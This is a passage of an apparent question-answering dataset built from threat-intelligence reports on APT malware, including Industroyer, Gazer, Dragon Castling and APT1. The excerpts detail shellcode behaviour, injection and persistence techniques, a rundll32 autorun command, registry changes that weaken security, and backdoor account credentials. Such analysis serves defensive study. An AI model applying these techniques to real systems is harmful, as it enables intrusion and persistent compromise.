oletools, can statically extract the embedded DLL payload from these documents.\nMedium Headline: RTF Shellcode Analysis\nThe RTF documents delivered in this attack campaign appear to be created by the same builder. All of the RTF files attempt to exploit CVE-2015-1641 to execute shellcode on the targeted system. Please reference https://technet.microsoft.com/en-us/library/security/ms15-033.aspx for more information.\nThe shellcode executed after successful exploitation begins by resolving the API functions it requires by enumerating the API functions within loaded modules in the current process. It then builds the following list of values:\nThe shellcode then enumerates the API functions, subjects them to a ROR7 hashing routine and XORs the resulting hash with 0x10ADBEEF. It uses the result of this arithmetic to compare with the list of values above to find the API functions it requires to carry out its functionality.\nSmall Headline: ROR7 ROR7^0x10ADBEEF API Func\nAfter resolving the API functions, the shellcode then begins searching for the embedded payload and decoy within the initial RTF file. It does so by searching the RTF file for three delimiters, specifically 0xBABABABABABA, 0xBBBBBBBB and 0xBCBCBCBC, which the shellcode uses to find the encrypted payload and decoy. The shellcode then decrypts the payload by XOR'ing four bytes at at time with the key 0xCAFEBABE, and decrypts the decoy by XOR'ing four bytes at a time using the key 0xBAADF00D. Here is a visual representation of the delimiters and embedded files:\nAfter decrypting the payload, it saves the file to the following location:\n%APPDATA%\\Microsoft\\Office\\OutL12.pip\nThe shellcode then creates the following registry key to automatically run the payload each time the system starts:\nSoftware\\Microsoft\\Windows\\CurrentVersion\\Run : Microsoft\nThe shellcode saves the following command to this autorun key, which will execute the OutL12.pip payload, specifically calling its 'WinCred' exported function:\nrundll32.exe\n\"%APPDATA\\Roaming\\Microsoft\\Office\\OutL12.pip\",WinCred\nThe shellcode will then overwrite the original delivery document with the decrypted decoy contents and open the new document.\nQ: How did the Werow macro used in the Microsoft Word documents achieve persistence on the infected systems?",
    "output": "The Werow macro used in the Microsoft Word documents achieved persistence by creating specific paths and registry keys. It built path strings for '%APPDATA%\\d.doc' and '%APPDATA%\\Microsoft\\Office\\WinCred.acl', where 'd.doc' stored a copy of the Word document and 'WinCred.acl' contained the dropped payload, typically a DLL. The macro then used rudimentary obfuscation to hide and re-assemble strings for the registry key 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WinCred' and the command 'rundll32 %APPDATA%\\Microsof\\Office\\WinCred.acl ,WinCred'. These steps ensured that the malware would run every time the system started.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What methods does the Luckycat campaign use to gather and transmit information from compromised computers, and how does this process ensure the attackers remain undetected?",
    "output": "The Luckycat campaign uses TROJ_WIMMIE or VBS_WIMMIE malware, which connects to a C&C server via HTTP over port 80. This malware uses Windows Management Instrumentation (WMI) to establish persistence, registering a script that works as a backdoor to the WMI event handler and deletes associated files. This makes the backdoor undetectable by antivirus software through simple file scanning. The compromised computer posts data to a PHP script on the C&C server, creating a file with information on the compromised computer. The attacker then issues commands to the compromised computer, such as getting the external IP address, downloading files, executing shell commands, and uploading files. The compromised computer sends the output to the C&C server and deletes the command file, ensuring the attackers remain undetected.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How do adversaries like TAG-38 compromise third-party servers, such as DVR/IP camera devices, to support their operations, including Command and Control, in the context of targeting Indian power grid assets?",
    "output": "Adversaries like TAG-38 compromise third-party servers, such as DVR/IP camera devices, to support their operations by exploiting vulnerabilities, including the use of default credentials. These compromised devices are then used for Command and Control (C2) communications, allowing the adversaries to remotely control and coordinate their attacks. In the context of targeting Indian power grid assets, TAG-38 has been observed using compromised DVR/IP camera devices as C2 servers, which are primarily geolocated in Taiwan or South Korea. The use of these compromised devices allows TAG-38 to maintain a level of anonymity and evade detection, while still being able to conduct their operations. Furthermore, the compromise of these devices highlights the importance of securing IoT devices, such as DVR/IP camera systems, and ensuring that software and firmware are kept up to date, and default passwords are changed to strong, complex ones.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: 104 payload component\nThis payload DLL has the filename 104 dll and is named after IEC 104 (aka ), an international standard  The IEC 104 protocol extends IEC 101, so the protocol can be transmitted over a TCP/IP network\nDue to its highly configurable nature, this payload can be customized by the attackers for different infrastructures  Figure 8 shows what a configuration file may look like\nOnce executed, the 104 payload DLL attempts to read its configuration file As described above, the path for the configuration file is supplied by the Launcher component\nThe configuration contains a STATION section followed by properties that configure how the 104 payload should work  The configuration may contain multiple STATION entries\nOur analysis of this component reveals the following possible configuration properties:\nOnce the configuration file is read, the 104 payload creates a thread for each STATION section defined in the configuration file  In each such thread, the 104 payload will attempt to communicate with the specified IP address using the protocol described in the IEC 104 standard  Before the connection is made, the 104 payload attempts to terminate the legitimate process that is normally responsible for IEC 104 communication with the device  It does so only if the stop_comm_service property is specified in its configuration  By default, the 104 payload terminates the process named D2MultiCommService.exe, or the process name specified in its configuration\nThe main idea behind the 104 payload is relatively simple  It connects to the specified IP address and starts to send packets with the ASDU address that was defined in its configuration  The goal of this communication is to interact with an IOA of a single command type\nIn the configuration file, the attacker can define the operation property to specify exactly how single command type IOAs will be iterated\nThe first such operation mode is the range mode  The attackers use this mode in order to discover possible IOAs in the targeted device  The attackers have to take this approach because the protocol described in the IEC 104 standard does not provide a specific method to obtain such information\nThe range mode has two stages  During the first stage, once the range of IOAs is obtained from the configuration file, the 104 payload connects to the target IP address and starts to iterate through the specified IOAs  To each such IOA the 104 payload sends \"select and execute\" packets in order to switch the state and to confirm whether the IOA belongs to the single command type\nOnce all possible IOAs from the specified range are iterated, the 104 payload switches to the second stage of range mode  If logging is enabled, the payload writes Starting only success to the log  The rest of this second stage is an infinite loop that uses the previously discovered IOAs of single command type  In the loop the payload constantly sends \"select and execute\" packets  In addition, if the option change is defined, the payload flips the On/Off state between loop steps\nFigure 10 demonstrates the log file that was produced by the 104 payload during our analysis  It shows the payload iterated IOAs from 10 to 15, and once IOAs of the single command type were discovered, the payload started to use them in the loop  The configuration had the change option\nenabled, so between loop iterations the payload flipped the switch value from On to Off and wrote it to the log\nThe second operation mode is the shift mode  This is very similar to the range mode  The attacker defines, in the configuration file, a range of IOAs and shift values  Once the 104 payload is activated it does everything the same way as in range mode; however, once all IOAs in the defined range are iterated, it starts to iterate over the new range  The new range is calculated by adding the shift values to the default range values\nThe third operation mode is the sequence mode  It can be used by attackers once they know the values of all IOAs of the single command type that are supported by the connected device  This payload immediately\nexecutes an infinite loop, sending \"select and execute\" packets to the IOAs defined in the configuration file\nAside from its logging capability, the 104 payload can output debug information to the console, as seen in Figure 11\n\nHow does the 104 payload component of Win32/Industroyer interact with industrial control systems, and what are the different operation modes it employs?",
    "output": "The 104 payload component of Win32/Industroyer interacts with industrial control systems by connecting to a specified IP address and sending packets with the ASDU address defined in its configuration. The goal is to interact with an Information Object Address (IOA) of a single command type. The payload supports three operation modes: range mode, shift mode, and sequence mode. In range mode, the payload iterates through a specified range of IOAs to discover those of the single command type and then enters an infinite loop to send 'select and execute' packets, potentially flipping the On/Off state. Shift mode is similar but iterates over a new range calculated by adding shift values to the default range. Sequence mode is used when the attacker already knows the values of all IOAs of the single command type and immediately executes an infinite loop, sending 'select and execute' packets to the defined IOAs.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: SImIlarITIeS wITh oTher Turla ToolS\nGazer is written in C++ and shares several similarities with other malware from the Turla APT family. Indeed, Gazer, Carbon and Kazuar can receive encrypted tasks from a C&C server, which can be executed either by the infected machine or by another machine on the network. They all use an encrypted container to store the malware's components and configuration and they also log their actions  in a file.\nThe list of C&C servers is encrypted and embedded in Gazer's PE resources. They are all compromised, legitimate websites (that mostly use the WordPress CMS) that act as a first layer proxy. This is also  a common tactic for the Turla APT group.\nAnother interesting linkage is that one of the C&C servers embedded in a Gazer sample was known  to be used in a JScript backdoor documented by Kaspersky as Kopiluak.\nLast but not least, these three malware families (Gazer, Carbon and Kazuar) have a similar list  of processes that may be employed as a target to inject the module used to communicate with the C&C server embedded in the binary. The resource containing this list can change from one sample  to another, it is likely tailored to what is installed on the system (for example, on some samples, the process name \"safari.exe\" can appear on the list).\nBig Headline: CuSTom enCrypTIon\nGazer's authors make extensive use of encryption. They don't use the Windows Crypto API  and don't seem to use any public library. It looks as if they are using their own library for 3DES and RSA.\nThe RSA keys embedded in the resources contains the attacker's public key which is used to encrypt the data sent to the C&C server, and a private key to decrypt resources embedded in its binaries. These keys are unique in each sample.\nThese resources are structured in the same way as (<https://wiki.openssl.org/index.php/Manual:Rsa(3)>)RSA from OpenSSL, but these values (p, q, etc.)  are computed by the custom implementation of Gazer's authors.\nFor 3DES, the IV and a static key are hardcoded and are the same in all samples. This 3DES key  is randomly generated and XORed with the static key. The random data used to XOR the static  key is prepended to the logfile header. This key is then used in the regular 3DES algorithm.\nSmall Headline: Named pipe generation\nTo establish a communication channel between Gazer components, a named pipe is initiated.\nThe named pipe is generated from this string:\n\\\\\\\\.\\\\pipe\\\\Winsock2\\\\CatalogChangeListener-FFFF-F\n1 Note that in all samples we have analyzed the process name is \"explorer.exe\"\nThe pattern \"FFFF-F\" is replaced with values computed from the security identifier (SID) of the current user and the current timestamp.\nLet's take for example the current date as: \"2017/04/24\" and the SID: \"S-1-5-21-84813077-3085987743-2510664113-1000\".\nTo generate the pattern at the end of the named pipe, some arithmetic is performed:\nIn this case, the named pipe will be:\n\\\\\\\\.\\\\pipe\\\\Winsock2\\\\CatalogChangeListener-9313-a\nIf the current user's SID cannot be retrieved, the named pipe \\\\\\\\.\\\\pipe\\\\\\Winsock2\\\\ CatalogChangeListener-FFFE-D will be used by default.\nSmall Headline: Code injection through thread hijacking\nA not-so-common trick is used in order to inject the orchestrator into a remote process. Indeed, a running thread from the remote process is hijacked in order to run shellcode that will execute  the communication module entry point.\n\u2022 The whole module and shellcode are copied into the remote process;\n\u2022 the function ZwQuerySystemInformation is used to retrieve the total number  of the running threads in the targeted process;\n\u2022 the following operations are attempted on each of those threads:\n\u2022 the thread is suspended with the OpenThread/SuspendThread functions;\n\u2022 the thread context is retrieved using GetThreadContext;\n\u2022 the context's instruction pointer is saved and modified to point to the shellcode  (through SetThreadContext);\n\u2022 the thread is resumed using ResumeThread.\n\u2022 if one of the previous operations fails, the thread is resumed and the same actions  are attempted on another thread.\nThe shellcode is just a loader that will execute the module entry point in a new thread.\nSmall Headline: Persistence\nThe loader sends binary data through the named pipe to the orchestrator. This blob contains:\n\u2022 a command ID (2): CMC_TAKE_LOADER_BODY\n\u2022 the loader path file\n\u2022 the loader PE\nOnce this message is received by the orchestrator, the loader is securely deleted by overwriting  the file content and deleted through the DeleteFile function.\nAfterwards, the persistency is set up. The persistency information is retrieved from the resource \"105\" and stored in the Gazer storage. Among these data, there is a dword value that is used to choose which persistency mode will be applied.\nThe resource 105 is structured in the following way:\n\u2022 a dword value representing the persistence mode\n\u2022 a dword value representing the size of the data\n\u2022 the persistence information\nThere are 6 different persistence modes.\nVery Small Headline: 2: ScreenSaverAutorun\nIn this mode, Gazer achieves persistency by setting up in the Windows registry the executable  file used for the screensaver.\nMany values are created under the HKCU\\Control Panel\\Desktop registry key:\n\u2022 SCRNSAVE.exe with the malware executable path\n\u2022 ScreenSaveActive is set to \"1\": enable the screensaver\n\u2022 ScreenSaverIsSecure is set to \"0\": specifies that the screensaver is not password-protected\n\u2022 ScreenSaveTimeout is set to a value given in the resource. It specifies how long the system remains idle before the screensaver (in this case: the malware) starts.\nVery Small Headline: 4: TaskSchedulerAutorun\nThis method is used to achieve persistence by creating a scheduled task.\nThe task is created and set up through COM interfaces related to tasks (ITaskService, ITaskSettings, \u2026).\nSome information such as the task name and its description is retrieved from the resource. For example, in one of the sample's resources, the persistency mode is set to 04 (TaskSchedulerAutorun) with the persistency data:\n%APPDATA%\\Adobe\\adobeup.exe Adobe Acrobat Reader Updater. This task was generated by Adobe Systems, Inc to keep your Adobe Software up-to-data. \\Adobe\\AcrobatReader.Adobe\nIn this example, a scheduled task will be created and set up thus:\n\u2022 Task name: \"Adobe Acrobat Reader Updater\"\n\u2022 Executable: \"%APPDATA%\\Adobe\\adobeup.exe\"\n\u2022 The orchestrator will copy the loader received through the named pipe to this location\n\u2022 Task description: \"This task was generated by Adobe Systems, Inc to keep your Adobe Software up-to-data\"\n\u2022 Task folder: \"\\Adobe\\AcrobatReader.Adobe\"\nLast but not least, the task is configured to be started by the task scheduler at any time after  its scheduled time has passed. The task will be triggered when the current user logs on.\nMedium Headline: Logs\nAll three Gazer components log their actions into logfiles. They are encrypted with the same algorithm: 3DES.\nIn some versions of Gazer, it is easy to retrieve these logfiles because their filenames are hardcoded into the binaries:\n\u2022 %TEMP%\\CVRG72B5.tmp.cvr: the logs from the loader\n\u2022 %TEMP%\\CVRG1A6B.tmp.cvr: the logs from the orchestrator\n\u2022 %TEMP%\\CVRG38D9.tmp.cvr: the logs from the communication module\nEach logfile is structured in the following way:\n\u2022 [LOGSIZE][DECRYPTION_KEY][ENCRYPTED_LOG]\n\u2022 logsize: when this value (2 bytes) is subtracted from the magic value 0xf18b, it gives  the encrypted log size\n\u2022 decryption_key: when this 12 bytes blob is XORed with another hardcoded key of 12 bytes, it gives the 3DES key that can be used to decrypt the log\n\u2022 encrypted_log: log encrypted with the 3DES algorithm in CBC mode\nOnce decrypted, each log entry is formatted in the following way:\n|Hour:Min:Sec:Ms| [log ID] [log]\nHere is an example with the decrypted orchestrator logfile:\nNote that in older Gazer versions, the \"log ID\" was replaced by the name of the current function. We believe that this log ID is an ID for the function where the log occurs.\nSmall Headline: Using the Windows Registry\nAll the files related to Gazer (except the logs) are stored encrypted within the registry. The orchestrator's resource \"109\" contains the root storage path (it will be designated %RootStoragePath% in the rest  of this paper). In every sample we examined, this resource pointed to the same storage path:\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ScreenSaver\nIf this resource is empty, the registry key above is used by default. Except for RSA keys, all the data  in the storage is encrypted2.\nSeveral subdirectories (whose names are hardcoded in the binary) are created.\n\u2022 %RootStoragePath%{119D263D-68FC-1942-3CA3-46B23FA652A0}\n\u2022 Object ID: a unique ID to identify the victim\n\u2022 %RootStoragePath%{1DC12691-2B24-2265-435D-735D3B118A70}\n\u2022 Task Queue: linked list of tasks to be executed\n\u2022 %RootStoragePath%{28E74BDA-4327-31B0-17B9-56A66A818C1D}\n\u2022 Plugins\n\u2022 %RootStoragePath%{31AC34A1-2DE2-36AC-1F6E-86F43772841F}\n\u2022 Communication Module: the DLL that communicates with the C&C server\n\u2022 %RootStoragePath%{3CDC155D-398A-646E-1021-23047D9B4366}\n\u2022 Autorun: the persistency method\n\u2022 %RootStoragePath%{4A3130BD-2608-730F-31A7-86D16CE66100}\n\u2022 Local Transport Settings: the computers IPs that are on the same network\n\u2022 %RootStoragePath%{56594FEA-5774-746D-4496-6361266C40D0}\n\u2022 Last Connection: last connection time with the C&C server (structure SYSTEMTIME)\n\u2022 %RootStoragePath%{629336E3-58D6-633B-5182-576588CF702A}\n\u2022 RSA Private Key: generated on the fly; used to decrypt the data from Gazer storage.\n\u2022 %RootStoragePath%{6CEE6FE1-10A2-4C33-7E7F-855A51733C77}\n\u2022 Result Queue: linked list of the tasks results\n\u2022 %RootStoragePath%{81A03BF8-60AA-4A56-253C-449121D61CAF}\n\u2022 Inject Settings: the list of processes to use to try to inject the communications module\n\u2022 %RootStoragePath%{8E9810C5-3014-4678-27EE-3B7A7AC346AF}\n\u2022 C&C servers\n2  See the \"Gazer Resources\" section for details\n\nQ: What are the similarities between Gazer, Carbon, and Kazuar in terms of their functionality and how they interact with C&C servers?",
    "output": "A: Gazer, Carbon, and Kazuar share several similarities in their functionality. All three can receive encrypted tasks from a C&C server, which can be executed either by the infected machine or by another machine on the network. They use an encrypted container to store the malware's components and configuration and log their actions in a file. Additionally, they have a similar list of processes that may be employed as a target to inject the module used to communicate with the C&C server embedded in the binary.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Medium Headline: Step 4\nIn the final step, the malware will iterate over C&C servers contained in the smcache.dat configuration file and will try to reach each one. The structure of the smcache.dat config file is as follows:\nThe protocol string can have one of nine possible values:\nTCP\nHTTPS\nUDP\nDNS\nICMP\nHTTPSIPV6\nWEB\nSSH\nHTTP\nDepending on the protocol tied to the particular C&C domain, the malware sets up the connection, sends a beacon to the C&C and waits for commands.\nIn this blogpost, we will mainly focus on the HTTP protocol option as we've seen it being used by the attackers.\nThe structure of the smcache.dat config file\nWhen using the HTTP protocol, the core module first opens two persistent request handles \u2013 one for POST and one for GET requests, both to \"/connect\" . These handles are tested by sending an empty buffer in the POST request and checking the HTTP status code of the GET request. Following this, the malware sends the initial beacon to the C&C server by calling the InternetWriteFile API with the previously opened POST request handle and reads data from the GET request handle by calling InternetReadFile .\nHTTP packet order\nHTTP POST beacon\nThe core module uses the following (mostly hard-coded) HTTP headers:\nAccept: */*\nx-cid: {<uuid>} \u2013 new uuid is generated for each GET/POST request pair\nPragma: no-cache\nCache-control: no-transform\nUser-Agent: <user_agent> \u2013 generated from registry or hard-coded (see below)\nHost: <host_value> \u2013 C&C server domain or the value from hostcfg.dat (see below)\nConnection: Keep-Alive\nContent-Length: 4294967295 (max uint, only in the POST request)\nSmall Headline: Initial beacon\nThe first data packet the malware sends to a C&C server contains a base64 encoded LZNT1-compressed buffer, including a newly generated uuid (different from the uuid used in the x-cid header), the victim's username, OS version and architecture, computer DNS and BIOS names and the comment string found in smcache.dat or comment.dat . The value from comment.dat takes precedence if this file exists.\nIn the core module sample we analyzed, there was actually a typo in the function that reads the value from comment.dat \u2013 it looks for the key \"COMMNET\" instead of \"COMMENT\" .\nAfter this, the malware enters a loop waiting for commands from the C&C server in the form of the ID value of one of the call objects.\nEach message sent to the C&C server contains a hard-coded four byte number value with the same structure as the values used as keys in the call-object map. The ID numbers associated with messages sent to C&C servers that we've seen are:\nInteresting observations about the protocols, other than the HTTP protocol:\nHTTPS does not use persistent request handles\nHTTPS uses HTTP GET request with data Base64-encoded in the cookie header to send the initial beacon\nHTTPS, TCP and UDP use a custom \"magic\" header: Magic-Code: hhjjdfgh\nSmall Headline: String obfuscation\nWe came across samples of the core module with only cleartext strings but also samples with certain strings obfuscated by XORing them with a unique (per sample) hard-coded key.\nEven within the samples that contain obfuscated strings, there are many cleartext strings present and there seems to be no logic in deciding which string will be obfuscated and which won't. For example, most format strings are obfuscated, but important IoCs such as credentials or filenames are not.\nTo illustrate this: most strings in the function that retrieves a value from the comment.dat file are obfuscated and the call to GetPrivateProfileStringW is dynamically resolved by the GetProcAddress API, but all the strings in the function that writes into the same config file are in cleartext and there is a direct call to\nWritePrivateProfileStringW .\nOverall, the core module code is quite robust and contains many failsafes and options for different scenarios (for example, the amount of possible protocols used for C&C communication), however, we probably only saw samples of this malware that are still in active development as there are many functions that are not yet implemented and only serve as placeholders.\nVery Small Headline: Zload (process starter)\nThis function is fairly simple, its main objective is to execute another binary. It first retrieves the path to the directory where the Zload plugin binary is located (<root_folder>) and creates a new subfolder called \"mec\" in it. After this it renames and moves three files into it:\nthe Zload plugin binary itself as <root_folder>\\mec\\logexts.dll ,\n<root_folder>\\spdlogd.exe as <root_folder>\\mec\\spdagent.exe and\n<root_folder>\\kb.ini as <root_folder>\\mec\\kb.ini\nAfter the files are renamed and moved, it creates a new process by executing the binary <root_folder>\\mec\\spdagent.exe (originally <root_folder>\\spdlogd.exe ).\nVery Small Headline: Backdoor user account creation\nNext, the plugin carries out registry manipulation (details can be found in the appendix), that lowers the system's protection by:\nAllowing local accounts to have full admin rights when they are authenticating via network logon\nEnabling RDP connections to the machine without the user password\nDisabling admin approval on an administrator account, which means that all applications run with full administrative privileges\nEnabling anonymous SID to be part of the everyone group in Windows\nAllowing \"Null Session\" users to list users and groups in the domain\nAllowing \"Null Session\" users to access shared folders\nSetting the name of the pipe that will be accessible to \"Null Session\" users\nAfter this step, the plugin changes the WebClient service startup type to \"Automatic\" . It creates a new user with the name \"DefaultAccount\" and the password \"Admin@1999!\" which is then added to the \"Administrator\" and \"Remote Desktop Users\" groups. It also hides the new account on the logon screen.\nAs the last step, the plugin checks the list of running processes for process names \"360tray.exe\" and \"360sd.exe\" and executes the file \"spdlogd.exe\" if neither of them is found.\nVery Small Headline: 4C73A62A9F19EEBB4FEFF4FDB88E4682EF852E37FFF957C9E1CFF27C5E5D47AD\nMecGame is another example of a plugin that can be loaded by the Core Plugin . Its main purpose is similar to the previously described Zload plugin \u2013 it executes the binary \"spdlogd.exe\" and achieves persistence by registering an RPC interface with UUID {1052E375-2CE2-458E-AA80-F3B7D6EA23AF} . This RPC interface represents a function that decodes and executes a base64 encoded shellcode.\nThe MecGame plugin has several methods for executing spdlogd.exe depending on the level of available privileges. It also creates a lockfile with the name MSSYS.lck or <UserName>-XPS.lck depending on the name of the process that loaded it, and deletes the files atomxd.dll and logexts.dll .\nIt can be installed as a service with the service name \"inteloem\" or can be loaded by any executable that connects to the internet via the Winsock2 library.\nVery Small Headline: ABA89668C6E9681671A95B3D7A08AAE2A067DEED2D835BA6F6FD18556C88A5F2\nThis DLL is a backdoor module which exports four functions: \"OperateRoutineW\" , \"StartRoutineW\" , \"StopRoutineW\" and \"WorkRoutineW\" ; the main malicious function being \"StartRoutineW\" .\nFor proper execution, the backdoor needs configuration data accessed through a shared object with the file mapping name either \"Global\\\\4ED8FD41-2D1B-4CC3-B874-02F0C60FF9CB\" or \"Local\\\\4ED8FD412D1B-4CC3-B874-02F0C60FF9CB\" . Unfortunately we didn't come across the configuration data, so we are missing some information such as the C&C server domains this module uses.\nThere are 15 commands supported by this backdoor (although some of them are not implemented) referred to by the following numerical identifiers:\nVery Small Headline: Communication protocol\nThe MulCom backdoor is capable of communicating via HTTP and TCP protocols. The data it exchanges with the C&C servers is encrypted and compressed by the RC4 and aPack algorithms respectively, using the RC4 key loaded from the configuration data object.\nIt is also capable of proxy server authentication using schemes such as Basic, NTLM, Negotiate or to authenticate via either the SOCKS4 and SOCKS5 protocols.\nAfter successful authentication with a proxy server, the backdoor sends data xorred by the constant 0xBC . This data is a set with the following structure:\nData structure\nAnother interesting capability of this backdoor is the usage of layered C&C servers. If this option is enabled in the configuration object (it is not the default option), the first request goes to the first layer C&C server, which returns the IP address of the second layer. Any subsequent communication goes to the second layer directly.\nAs previously stated, we found several code similarities between the MulCom DLL and the FFRat (a.k.a. FormerFirstRAT ).\nBig Headline: Conclusion\nWe have described a robust and modular toolset used most likely by a Chinese speaking APT group targeting gambling-related companies in South East Asia. As we mentioned in this blogpost, there are notable code similarities between FFRat samples and the MulCom backdoor. FFRat or \"FormerFirstRAT'' has been publicly associated with the DragonOK group according to the Palo Alto Network report, which has in turn been associated with backdoors like PoisonIvy and PlugX \u2013 tools commonly used by Chinese speaking attackers.\nWe also described two different infection vectors, one of which weaponized a vulnerable WPS Office updater. (<https://www.wps.com/about-us/>)We rate the threat this infection vector represents as very high, as WPS Office claims to have , and this vulnerability potentially allows a simple way to execute arbitrary code on any of these devices. We have contacted WPS Office about the vulnerability we discovered and it has since been fixed.\nOur research points to some unanswered questions, such as reliable attribution and the attackers' motivation.\nAnswer this question: Explain the process by which the Zload plugin in Operation Dragon Castling creates a backdoor user account. What registry manipulations are performed to lower the system's protection?",
    "output": "The Zload plugin performs several registry manipulations to lower the system's protection, including allowing local accounts to have full admin rights during network logon, enabling RDP connections without a user password, disabling admin approval on an administrator account, enabling anonymous SID to be part of the 'everyone' group, allowing 'Null Session' users to list users and groups in the domain, allowing 'Null Session' users to access shared folders, and setting the name of the pipe accessible to 'Null Session' users. It then creates a new user named 'DefaultAccount' with the password 'Admin@1999!' and adds this account to the 'Administrator' and 'Remote Desktop Users' groups. Finally, it hides the new account on the logon screen and checks for specific running processes before executing 'spdlogd.exe' if necessary.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Medium Headline: Synopsis of PLA Unit 61398\nThe evidence we have collected on PLA Unit 61398's mission and infrastructure reveals an organization that:\n\u00bb\u00bb Employs hundreds, perhaps thousands of personnel\n\u00bb\u00bb Requires personnel trained in computer security and computer network operations\n\u00bb\u00bb Requires personnel proficient in the English language\n\u00bb\u00bb Has large-scale infrastructure and facilities in the \"Pudong New Area\" of Shanghai\n\u00bb\u00bb Was the beneficiary of special fiber optic communication infrastructure provided by state-owned enterprise China Telecom in the name of national defense\nThe following sections of this report detail APT1's cyber espionage and data theft operations. The sheer scale and duration of these sustained attacks leave little doubt about the enterprise scale of the organization behind this campaign. We will demonstrate that the nature of APT1's targeted victims and the group's infrastructure and tactics align with the mission and infrastructure of PLA Unit 61398.\nOnce APT1 has compromised a network, they repeatedly monitor and steal proprietary data and communications from the victim for months or even years. For the organizations in (<>)Figure 10, we found that APT1 maintained access to the victim's network for an average of 356 days.27 The longest time period APT1 maintained access to a victim's network was at least 1,764 days, or four years and ten months. APT1 was not continuously active on a daily basis during this time period; however, in the vast majority of cases we observed, APT1 continued to commit data theft as long as they had access to the network.\nMedium Headline: APT1's Geographic & Industry Focus\nThe organizations targeted by APT1 primarily conduct their operations in English. However, we have also seen the group target a small number of non-English speaking victims. A full 87% of the APT1 victims we have observed are headquartered in countries where English is the native language (see (<>)Figure 11). This includes 115 victims located in the U.S. and seven in Canada and the United Kingdom. Of the remaining 19 victims, 17 use English as a primary language for operations. These include international cooperation and development agencies, foreign governments in which English is one of multiple official languages, and multinational conglomerates that primarily conduct their business in English. Only two victims appear to operate using a language other than English. Given that English-language proficiency is required for many members of PLA Unit 61398, we believe that the two non-English speaking victims are anomalies representing instances in which APT1 performed tasks outside of their normal activities.\n27  This is based on 91 of the 141 victim organizations shown. In the remaining cases, APT1 activity is either ongoing or else we do not have visibility into the last known date of APT1 activity in the network.\nFIGure 11: Geographic location of aPt1's victims. In the case of victims with a multinational presence, the location shown reflects either the branch of the organization that aPt1 compromised (when known), or else is the location of the organization's headquarters.\nAPT1 has demonstrated the capability and intent to steal from dozens of organizations across a wide range of industries virtually simultaneously. (<>)Figure 12 provides a view of the earliest known date of APT1 activity against all of the 141 victims we identified, organized by the 20 major industries they represent. The results suggest that APT1's mission is extremely broad; the group does not target industries systematically but more likely steals from an enormous range of industries on a continuous basis. Since the organizations included in the figure represent only the fraction of APT1 victims that we confirmed directly, the range of industries that APT1 targets may be even broader than our findings suggest.\nFurther, the scope of APT1's parallel activities implies that the group has significant personnel and technical resources at its disposal. In the first month of 2011, for example, (<>)Figure 12 shows that APT1 successfully compromised 17 new victims operating in 10 different industries. Since we have seen that the group remains active in each victim's network for an average of nearly a year after the initial date of compromise, we infer that APT1 committed these 17 new breaches while simultaneously maintaining access to and continuing to steal data from a number of previously compromised victims.\nTIMELINE OF APT1 COMPROMISES BY INDUSTRY SECTOR\nFIGure 12: timeframe of aPt1's cyber espionage operations against organizations by industry. the dots within each bar represent the earliest known date on which aPt1 compromised a new organization within the industry.\nWe believe that organizations in all industries related to China's strategic priorities are potential targets of APT1's comprehensive cyber espionage campaign. While we have certainly seen the group target some industries more  heavily than others (see (<>)Figure 13), our observations confirm that APT1 has targeted at least four of the seven  strategic emerging industries that China identified in its 12th Five Year Plan.28\nIndustries Compromised by APT1\nFIGure 13: number of aPt1 victims by industry. we determined each organization's industry based on reviewing its industry classification in the hoover's29 system. we also considered the content of the data that aPt1 stole in each case, to the extent that this information was available.\n28  Joseph Casey and Katherine Koleski, Backgrounder: China's 12th Five-Year Plan, U.S.-China Economic & Security Review Commission (2011), 19, (<http://www.uscc.gov/researchpapers/2011/12th-FiveYearPlan_062811.pdf>)http://www.uscc.gov/researchpapers/2011/12th-FiveYearPlan_062811.pdf, accessed February 3, 2013.\n29  http://www.hoovers.com/\nMedium Headline: APT1 Data Theft\nAPT1 steals a broad range of information from its victims. The types of information the group has stolen relate to:\n\u00bb\u00bb product development and use, including information on test results, system designs, product manuals, parts lists, and simulation technologies;\n\u00bb\u00bb manufacturing procedures, such as descriptions of proprietary processes, standards, and waste management processes;\n\u00bb\u00bb business plans, such as information on contract negotiation positions and product pricing, legal events, mergers, joint ventures, and acquisitions;\n\u00bb\u00bb policy positions and analysis, such as white papers, and agendas and minutes from meetings involving high-ranking personnel;\n\u00bb\u00bb emails of high-ranking employees; and\n\u00bb\u00bb user credentials and network architecture information.\nIt is often difficult for us to estimate how much data APT1 has stolen during their intrusions for several reasons:\n\u00bb\u00bb APT1 deletes the compressed archives after they pilfer them, leaving solely trace evidence that is usually overwritten during normal business activities.\n\u00bb\u00bb Pre-existing network security monitoring rarely records or identifies the data theft.\n\u00bb\u00bb The duration of time between the data theft and Mandiant's investigation is often too great, and the trace evidence of data theft is overwritten during the normal course of business.\n\u00bb\u00bb Some victims are more intent on assigning resources to restore the security of their network in lieu of investigating and understanding the impact of the security breach.\nEven with these challenges, we have observed APT1 steal as much as 6.5 terabytes of compressed data from a single organization over a ten-month time period. Given the scope of APT1's operations, including the number of organizations and industries we have seen them target, along with the volume of data they are clearly capable of stealing from any single organization, APT1 has likely stolen hundreds of terabytes from its victims.\nAlthough we do not have direct evidence indicating who receives the information that APT1 steals or how the recipient processes such a vast volume of data, we do believe that this stolen information can be used to obvious advantage by the PRC and Chinese state-owned enterprises. As an example, in 2008, APT1 compromised the network of a company involved in a wholesale industry. APT1 installed tools to create compressed file archives and to extract emails and attachments. Over the following 2.5 years, APT1 stole an unknown number of files from the victim and repeatedly accessed the email accounts of several executives, including the CEO and General Counsel. During this same time period, major news organizations reported that China had successfully negotiated a double-digit decrease in price per unit with the victim organization for one of its major commodities. This may be coincidental; however, it would be surprising if APT1 could continue perpetrating such a broad mandate of cyber espionage and data theft if the results of the group's efforts were not finding their way into the hands of entities able to capitalize on them.\nAnswer this question: Why is it challenging to estimate the amount of data stolen by APT1 during their intrusions?",
